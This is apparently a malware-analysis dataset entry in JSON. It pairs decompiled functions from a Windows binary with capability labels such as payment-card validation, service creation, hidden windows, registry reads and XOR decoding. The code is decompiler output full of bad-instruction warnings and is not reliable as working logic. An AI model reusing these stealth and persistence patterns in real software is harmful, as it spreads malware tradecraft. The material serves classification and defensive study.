    "00403100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031cf) overlaps instruction at (ram,0x004031ca)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403159)\n// WARNING: Removing unreachable block (ram,0x00403142)\n// WARNING: Removing unreachable block (ram,0x0040314e)\n// WARNING: Removing unreachable block (ram,0x00403157)\n// WARNING: Removing unreachable block (ram,0x004030e7)\n// WARNING: Removing unreachable block (ram,0x00403181)\n\nuint fcn.00403100(uint param_1)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    ushort extraout_DX;\n    uchar *puVar2;\n    uint *puVar3;\n    bool bVar4;\n    uchar uStack532;\n    uint uStack531;\n    uchar uStack272;\n    uint uStack271;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack532 = 0;\n    puVar3 = &uStack531;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uStack272 = 0;\n    puVar3 = &uStack271;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&uStack532, 0x104);\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack272, 0x407024, &uStack532, param_1);\n    fcn.00403070(&uStack8, &uStack12);\n    bVar4 = (POPCOUNT(extraout_DX + (extraout_DX >> 8)) & 1U) == 0;\n    fcn.00403210(uStack8);\n    puVar2 = &stack0xfffffffc;\n    if ((!bVar4) && (puVar2 = &stack0xfffffffc,  bVar4)) {\n        uStack12 = extraout_ECX;\n        puVar2 = *0x8b17b43a + -1;\n    }\n    iVar1 = fcn.004039b0(puVar2 + -0x10c, *(puVar2 + -4), uStack12);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00402a00(puVar2 + -0x10c, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 688
    },
    "00403c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c10(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00403c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403c80(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00403d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403dcc) overlaps instruction at (ram,0x00403dca)\n// \n// WARNING: Removing unreachable block (ram,0x00403e8d)\n// WARNING: Removing unreachable block (ram,0x00403e9a)\n// WARNING: Removing unreachable block (ram,0x00403e4b)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.00403d00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *unaff_EDI;\n    uint *puVar3;\n    uchar uVar4;\n    float10 fVar5;\n    uchar var_10ch;\n    uint var_10bh;\n    uint uStack256;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = &var_10ch < 0;\n    if ((!SBORROW4(&stack0xfffffffc, 0x10c)) && (SBORROW4(&stack0xfffffffc, 0x10c))) {\n        *unaff_EDI = uStack256;\n        return;\n    }\n    fcn.004035e0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fVar5 = fcn.004035e0(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    iVar2 = arg_20h;\n    if ((!uVar4) && (uVar4)) {\n        *(arg_1ch + 0x1c) = fVar5;\n        arg_1ch = arg_1ch + 5;\n        iVar2 = arg_20h + 5;\n    }\n    fcn.004035e0(arg_18h, arg_1ch, arg_10h, 0x20, iVar2 + 0xa0);\n    fcn.004035e0(arg_18h, arg_1ch, arg_14h, 0x20, iVar2 + 0xe0);\n    if ((-1 < &stack0xfffffee8) && (-1 >= &stack0xfffffee8)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = fcn.00403cb0();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(iVar2 + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(iVar2 + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_4h = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = fcn.00403af0(0x80000001, 0x407258, 0x407284, &var_8h, &var_10ch, &var_4h);\n    if ((iVar2 != 0) && (iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x4072d4),  iVar2 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 882
    },
    "00403eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ee9) overlaps instruction at (ram,0x00403ee4)\n// \n// WARNING: Removing unreachable block (ram,0x00403ee9)\n// WARNING: Removing unreachable block (ram,0x00403f2e)\n// WARNING: Removing unreachable block (ram,0x00403eee)\n\nuint fcn.00403eb0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *unaff_EBP;\n    int32_t iVar3;\n    uint16_t in_ES;\n    uint32_t uVar4;\n    \n    uVar4 = 0x407104;\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407104);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = iVar2;\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        uVar4 = uVar4 & 0xffff0000 | in_ES;\n        iVar3 = iVar2 + -1;\n        *unaff_EBP = iVar2;\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x41e878 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, 0x407114, uVar4);\n    *0x41e87c = (*pcVar1)(iVar3, 0x407130);\n    *0x41e880 = (*pcVar1)(iVar3, 0x407140);\n    if (((*0x41e878 != 0) && (*0x41e87c != 0)) && (*0x41e880 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 390
    },
    "00403f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403f60(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00404cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cf0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    uint32_t in_ECX;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar2 = *(uVar3 + arg_10h) ^ *(uVar3 % arg_ch + arg_8h);\n            in_ECX = in_ECX & 0xffffff00 | uVar2;\n            if (('\\0' < uVar2) && (uVar2 < '\\x01')) {\n                if (in_ECX == 0) {\n                    pcVar1 = swi(1);\n                    (*pcVar1)();\n                    return;\n                }\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *(uVar3 + arg_10h) = uVar2;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00402350": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402350(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 78
    },
    "00403af0": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403b9a) overlaps instruction at (ram,0x00403b99)\n// \n// WARNING: Removing unreachable block (ram,0x00403b85)\n// WARNING: Removing unreachable block (ram,0x00403b9a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00403af0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint hKey;\n    \n    if ((0x7 < &stack0xfffffffc) && (0x7 >= &stack0xfffffffc)) {\n        out(0xbd, in_EAX);\n        return in_EAX;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return 0;\n}\n",
        "token_count": 306
    },
    "00404c90": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x41e840, 0x41e88c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 141
    }
}